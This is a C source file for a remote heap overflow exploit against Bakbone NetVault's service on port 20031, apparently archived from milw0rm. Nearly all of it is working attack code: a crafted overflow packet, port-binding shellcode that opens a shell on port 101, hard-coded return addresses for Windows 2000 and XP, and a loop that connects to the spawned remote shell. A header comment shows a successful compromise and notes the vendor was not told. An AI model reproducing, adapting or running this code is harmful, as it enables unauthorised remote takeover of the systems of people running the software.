/* Bakbone Netvault heap overflow exploit. 
Software Hole discovered by BuzzDee
POC written by nolimit and BuzzDee.

As class101 has already shown, this application has a lot of holes. 
This is another remote heap overflow. This was tested on the demo version
of netvault. We considered mailing the vendor on this one, but figured we'd recieve
the same response class did, which was none. So perhaps a second critical vulnerabilty
will wake Bakbone up to their software faults. 

A note to skiddies about this exploit
This won't really net you a lot of elite b0xes because class101's isn't patched,
 so it's just as vulnerable as this. Not to mention the fact that not many businesses
 use this software anyway.
 ..Maybe it's because of all the holes??

Thx to Flare, AceHigh, Shift,class101, and of course BuzzDee.
Sorry.. everyone wants to be famous :)


 C:\CODING\c++\netvault\Release>netvault 1 2KVM
[*] Target:     2KVM    Port: 20031

Targetting 2K..
[*] Socket initialized...
[*] Sending  buffer.
[*] Sleeping..............
[*] Connecting again to trigger overflow..
[*] Connecting to host: 2KVM on port 101
[*] Exploit worked! dropping into shell
Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\Program Files\BakBone Software\NetVault>
-nolimit@COREiSO
*/
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <winsock.h>
#pragma comment(lib,"ws2_32")

void cmdshell (int sock);
long gimmeip(char *hostname);
char buffer[40000];
//initial request to host
char packet[]=
"\x00\x00\x02\x01\x00\x00\x00\x8F\xD0\xF0\xCA\x0B\x00\x00\x00\x69"
"\x3B\x62\x3B\x6F\x3B\x6F\x3B\x7A\x3B\x00\x11\x57\x3C\x42\x00\x01"
"\xB9\xF9\xA2\xC8\x00\x00\x00\x00\x03\x00\x00\x00\x00\x01\xA5\x97"
"\xF0\xCA\x05\x00\x00\x00\x6E\x33\x32\x3B\x00\x20\x00\x00\x00\x10"
"\x02\x4E\x3F\xAC\x14\xCC\x0A\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
"\xA5\x97\xF0\xCA\x05\x00\x00\x00\x6E\x33\x32\x3B\x00\x20\x00\x00"
"\x00\x10\x02\x4E\x3F\xC0\xA8\xEA\xEB\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\xA5\x97\xF0\xCA\x05\x00\x00\x00\x6E\x33\x32\x3B\x00\x20"
"\x00\x00\x00\x10\x02\x4E\x3F\xC2\x97\x2C\xD3\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\xB9\xF9\xA2\xC8\x02\x02\x00\x00\x00\xA5\x97\xF0\xCA"
"\x05\x00\x00\x00\x6E\x33\x32\x3B\x00\x20\x00\x00\x00\x04\x02\x4E"
"\x3F\xAC\x14\xCC\x0A\xB0\xFC\xE2\x00\x00\x00\x00\x00\xEC\xFA\x8E"
"\x01\xA4\x6B\x41\x00\xE4\xFA\x8E\x01\xFF\xFF\xFF\xFF\x01\x02";
//class101 modified shellcode from metasploit.com. yummy.
char shellcode[]=
	"\x33\xC9\x83\xE9\xAF\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\xBB"
	"\x1E\xD3\x6A\x83\xEB\xFC\xE2\xF4\x47\x74\x38\x25\x53\xE7\x2C\x95"
	"\x44\x7E\x58\x06\x9F\x3A\x58\x2F\x87\x95\xAF\x6F\xC3\x1F\x3C\xE1"
	"\xF4\x06\x58\x35\x9B\x1F\x38\x89\x8B\x57\x58\x5E\x30\x1F\x3D\x5B"
	"\x7B\x87\x7F\xEE\x7B\x6A\xD4\xAB\x71\x13\xD2\xA8\x50\xEA\xE8\x3E"
	"\x9F\x36\xA6\x89\x30\x41\xF7\x6B\x50\x78\x58\x66\xF0\x95\x8C\x76"
	"\xBA\xF5\xD0\x46\x30\x97\xBF\x4E\xA7\x7F\x10\x5B\x7B\x7A\x58\x2A"
	"\x8B\x95\x93\x66\x30\x6E\xCF\xC7\x30\x5E\xDB\x34\xD3\x90\x9D\x64"
	"\x57\x4E\x2C\xBC\x8A\xC5\xB5\x39\xDD\x76\xE0\x58\xD3\x69\xA0\x58"
	"\xE4\x4A\x2C\xBA\xD3\xD5\x3E\x96\x80\x4E\x2C\xBC\xE4\x97\x36\x0C"
	"\x3A\xF3\xDB\x68\xEE\x74\xD1\x95\x6B\x76\x0A\x63\x4E\xB3\x84\x95"
	"\x6D\x4D\x80\x39\xE8\x4D\x90\x39\xF8\x4D\x2C\xBA\xDD\x76\xD3\x0F"
	"\xDD\x4D\x5A\x8B\x2E\x76\x77\x70\xCB\xD9\x84\x95\x6D\x74\xC3\x3B"
	"\xEE\xE1\x03\x02\x1F\xB3\xFD\x83\xEC\xE1\x05\x39\xEE\xE1\x03\x02"
	"\x5E\x57\x55\x23\xEC\xE1\x05\x3A\xEF\x4A\x86\x95\x6B\x8D\xBB\x8D"
	"\xC2\xD8\xAA\x3D\x44\xC8\x86\x95\x6B\x78\xB9\x0E\xDD\x76\xB0\x07"
	"\x32\xFB\xB9\x3A\xE2\x37\x1F\xE3\x5C\x74\x97\xE3\x59\x2F\x13\x99"
	"\x11\xE0\x91\x47\x45\x5C\xFF\xF9\x36\x64\xEB\xC1\x10\xB5\xBB\x18"
	"\x45\xAD\xC5\x95\xCE\x5A\x2C\xBC\xE0\x49\x81\x3B\xEA\x4F\xB9\x6B"
	"\xEA\x4F\x86\x3B\x44\xCE\xBB\xC7\x62\x1B\x1D\x39\x44\xC8\xB9\x95"
	"\x44\x29\x2C\xBA\x30\x49\x2F\xE9\x7F\x7A\x2C\xBC\xE9\xE1\x03\x02" 
	"\x54\xD0\x33\x0A\xE8\xE1\x05\x95\x6B\x1E\xD3\x6A";

char jmpToXP[]="\xBD\x9B\x36\x7C"; //XP SP1
char uefOverWriteXP[]="\xB4\x73\xED\x77";//XP SP1
char jmpTo2K[]="\x7E\x6D\x03\x75";  //2k SP4
char uefOverWrite2K[]="\x4C\x14\x54\x7C";  //2K SP4

int main(int argc,char *argv[])
{     
		WSADATA wsaData;
		struct sockaddr_in targetTCP;
		int sockTCP,s;
		unsigned short port = 20031;
		long ip;
		if(argc < 3)
		{
			
			printf("Bakbone Netvault Remote Heap Overflow.\n"
				"Usage: %s [Target] [address] <port>\n"
				" eg: netvault.exe 1 127.0.0.1\n"
				"Targets\n1. Windows 2000\n2. Windows XP SP0-1\n"
					"Coded by nolimit@CiSO and BuzzDee.\n",argv[0]);
			return 1;			
		}		
		if(argc==4)
			port = atoi(argv[3]);					
        WSAStartup(0x0202, &wsaData);				
		printf("[*] Target:\t%s \tPort: %d\n\n",argv[2],port);
		ip=gimmeip(argv[2]);	
        targetTCP.sin_family = AF_INET;
        targetTCP.sin_addr.s_addr = ip;
        targetTCP.sin_port = htons(port);
		memset(buffer,'\x90',40000);
		memcpy(buffer,packet,sizeof(packet)-1); //request packet
		memcpy(buffer+32790,"\xEB\x0C",2); //JMP ahead over the 2 overwrites
		switch(atoi(argv[1]))
		{
			case 1:
			printf("Targetting 2K..\n");
			memcpy(buffer+32792,jmpTo2K,sizeof(jmpTo2K)-1); //overwrite pointer to CALL [EDI+74]
			memcpy(buffer+32796,uefOverWrite2K,sizeof(uefOverWrite2K)-1); //UEF as chosen.
			break;
			case 2:
			printf("Targetting XP..\n");
			memcpy(buffer+32792,jmpToXP,sizeof(jmpToXP)-1); //overwrite pointer to CALL [EDI+74]
			memcpy(buffer+32796,uefOverWriteXP,sizeof(uefOverWriteXP)-1); //UEF as chosen.
			break;
			default:
			printf("Error target not found.\n");
			return 1;
			break;
		}
		memcpy(buffer+32820,shellcode,sizeof(shellcode)-1); //101 portbind thx class101/metasploit ;p
		memcpy(buffer+39947,"\x00\x00\x00",3); //all done! only 39950 bytes! ;P
		if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("[x] Socket not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}
		printf("[*] Socket initialized...\n");					
		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("[*] Connection to host failed! Exiting...\n");
			WSACleanup();
			exit(1);
		} 		
		printf("[*] Sending  buffer.\n");
		Sleep(1000);
		if (send(sockTCP, buffer, 39950,0) == -1)
		{
				printf("[x] Failed to inject packet! Exiting...\n");
				WSACleanup();
                return 1;
		}		
		printf("[*] Sleeping.");
		for(s=0;s<8;s++)
		{ //wait for it to catch
			printf(".");
			Sleep(500);
		}
		closesocket(sockTCP);
		for(s=0;s<5;s++)
		{
			printf(".");
			Sleep(500);
		} //exploit triggers when you reconnect sometimes
		printf("\n[*] Connecting again to trigger overflow..\n");
		if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{ 
				printf("[x] Socket not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}
		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("[*] Connection to host failed! Exiting...\n");
			WSACleanup();
			exit(1);
		} 		
		Sleep(500);
		closesocket(sockTCP);
				
		printf("[*] Connecting to host: %s on port 101\n",argv[2]);
		if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("[x] Socket not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}
		targetTCP.sin_port= htons(101);
		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("[*] Connection to host failed! Exiting...\n");
			WSACleanup();
			exit(1);
		} 		
		printf("[*] Exploit worked! dropping into shell\n");
		cmdshell(sockTCP);
		WSACleanup();
		exit(1);
		return 0;
}
/*
Taken from some random exploit.
good, simple cmdshell function.
*/
void cmdshell (int sock)
{
 struct timeval tv;
 int length;
 unsigned long o[2];
 char buffer[1000];
 
 tv.tv_sec = 1;
 tv.tv_usec = 0;

 while (1) 
 {
	o[0] = 1;
	o[1] = sock;	

	length = select (0, (fd_set *)&o, NULL, NULL, &tv);
	if(length == 1)
	{
		length = recv (sock, buffer, sizeof (buffer), 0);
		if (length <= 0) 
		{
			printf ("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
		length = write (1, buffer, length);
		if (length <= 0) 
		{
			printf ("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
	}
	else
	{
    	length = read (0, buffer, sizeof (buffer));
		if (length <= 0) 
		{
			printf("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
		length = send(sock, buffer, length, 0);
		if (length <= 0) 
		{
			printf("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
	}
}

}
/*********************************************************************************/
long gimmeip(char *hostname) 
{
	struct hostent *he;
	long ipaddr;
	
	if ((ipaddr = inet_addr(hostname)) < 0) 
	{
		if ((he = gethostbyname(hostname)) == NULL) 
		{
			printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);
			WSACleanup();
			exit(1);
		}
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}	
	return ipaddr;
}
/*********************************************************************************/

// milw0rm.com [2005-05-17]
